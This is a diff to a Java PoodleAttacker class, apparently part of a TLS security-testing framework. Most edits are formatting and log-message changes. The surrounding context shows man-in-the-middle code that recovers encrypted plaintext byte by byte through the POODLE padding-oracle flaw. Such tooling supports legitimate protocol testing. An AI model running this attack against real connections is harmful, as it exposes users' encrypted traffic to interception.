@@ -103,11 +103,10 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
         startingMessageLength = receiveMessageWithLength();
 
-
         while (!foundPaddingLength) {
 
             int currentMessageLength = receiveMessageWithLength();
-            if ( currentMessageLength > startingMessageLength) {
+            if (currentMessageLength > startingMessageLength) {
 
                 messageLengthAfterChange = currentMessageLength;
                 CONSOLE.info("Padding length is: " + paddingLength);
@@ -124,8 +123,8 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                 break;
             }
         }
-        CONSOLE.info("Block size found: " +(messageLengthAfterChange-startingMessageLength));
-        return messageLengthAfterChange-startingMessageLength;
+        CONSOLE.info("Block size found: " + (messageLengthAfterChange - startingMessageLength));
+        return messageLengthAfterChange - startingMessageLength;
     }
 
     public int receiveMessageWithLength() {
@@ -163,7 +162,7 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
             }
 
         } catch (Exception e) {
-            System.out.println("No data yet");
+            CONSOLE.info("No data was sent!");
             e.printStackTrace();
         }
         return messageLengthReceived;
@@ -181,7 +180,7 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
 
         while (positionOfBlockToDecrypt < 4) {
             i++;
-            CONSOLE.info("ITERATION: " + i + "     " + "Decrypted message: " + decryptedMessage);
+            CONSOLE.info("Iteration: " + i + "     " + "Decrypted message so far: " + decryptedMessage);
             Config conf = config.createConfig();
             conf.setWorkflowTraceType(WorkflowTraceType.SIMPLE_FORWARDING_MITM_PROXY);
             conf.setDefaultRunningMode(RunningModeType.MITM);
@@ -215,18 +214,18 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         continue;
                     }
 
-                    CONSOLE.info("==============Before modification========================");
+                    CONSOLE.info("====================BEFORE MODIFICATION=================================");
                     CONSOLE.info(mar.getRecordList().get(0).getCompleteRecordBytes());
-                    CONSOLE.info("-------------------------------------------------------------");
+                    CONSOLE.info("------------------------------------------------------------------------");
                     CONSOLE.info(mar.getRecordList().get(1).getCompleteRecordBytes());
-                    CONSOLE.info("==========================================================");
+                    CONSOLE.info("========================================================================");
 
                     // Modify the byte, putt a block as padding, skip 5 first bytes plus the first
                     // block.
                     byte[] modified_bytes = poodleUtils
                             .replacePaddingWithBlock(mar.getRecordList().get(1).getCompleteRecordBytes().getValue(),
                                     block_size,
-                                    message_offset + (block_size*positionOfBlockToDecrypt));
+                                    message_offset + (block_size * positionOfBlockToDecrypt));
 
                     AbstractRecord modified_record = mar.getRecordList().get(1);
 
@@ -240,11 +239,11 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                     modified_record_list.add(0, mar.getRecordList().get(0));
                     modified_record_list.add(1, record);
 
-                    CONSOLE.info("==================After modification=========================");
+                    CONSOLE.info("=====================AFTER MODIFICATION=================================");
                     CONSOLE.info(modified_record_list.get(0).getCompleteRecordBytes());
-                    CONSOLE.info("---------------------------------------------------------");
+                    CONSOLE.info("------------------------------------------------------------------------");
                     CONSOLE.info(modified_record_list.get(1).getCompleteRecordBytes());
-                    CONSOLE.info("===============================================================");
+                    CONSOLE.info("========================================================================");
 
                     sendMessageHelper.sendRecords(modified_record_list, state.getOutboundTlsContexts().get(0));
 
@@ -254,18 +253,17 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                     if (mar2.getMessageList().size() == 0) {
                         httphandler.bytedecrypted = true;
                         i = 0;
-                        CONSOLE.info("------->   Server sent no alert! Modified Message was accepted  <--------");
-
-                        CONSOLE.info("=====================DECRYPTING BYTE=====================================");
-
+                        CONSOLE.info("Server sent no alert! Modified Message was accepted  ");
+                        
                         // Get the block before the message block we are going to decrypt
-                        byte[] block_before_message = Arrays.copyOfRange(modified_bytes, message_offset + (block_size*(positionOfBlockToDecrypt-1)),
-                        message_offset + (block_size*positionOfBlockToDecrypt));
+                        byte[] block_before_message = Arrays.copyOfRange(modified_bytes,
+                                message_offset + (block_size * (positionOfBlockToDecrypt - 1)),
+                                message_offset + (block_size * positionOfBlockToDecrypt));
 
                         // Gets the block that is positioned before the padding block
                         byte[] block_before_padding = Arrays.copyOfRange(modified_bytes,
                                 modified_bytes.length - 2 * block_size,
-                                modified_bytes.length -  block_size);
+                                modified_bytes.length - block_size);
 
                         byte found_byte;
 
@@ -276,10 +274,11 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         }
 
                         // If we decrypted the full block then move to the next block
-                        if(decryptedBytesSoFar == block_size){
+                        if (decryptedBytesSoFar == block_size) {
                             positionOfBlockToDecrypt++;
-                            decryptedBytesSoFar=0;
+                            decryptedBytesSoFar = 0;
                             httphandler.block_decrypted = true;
+
                         }
 
                         decryptedBytesSoFar++;
@@ -288,6 +287,8 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         // better way
                         byte[] decrypted_string = { found_byte };
 
+                        CONSOLE.info("========================================================================");
+
                         CONSOLE.info("Decrypted byte is: " + new String(decrypted_string));
 
                         decryptedMessage = new String(decrypted_string) + decryptedMessage;
@@ -295,9 +296,7 @@ public class PoodleAttacker extends Attacker<PoodleCommandConfig> {
                         CONSOLE.info("========================================================================");
 
                     } else {
-                        CONSOLE.info("==========================Alert found ===============================");
-                        CONSOLE.info(mar2.getMessageList().get(0).getCompleteResultingMessage());
-                        CONSOLE.info("===================================================================");
+                        CONSOLE.info("Alert found! Server did not accept the modified message. Continuing with the next attempt.");
                     }
 
                     state.getInboundTlsContexts().get(0).getTransportHandler().closeConnection();
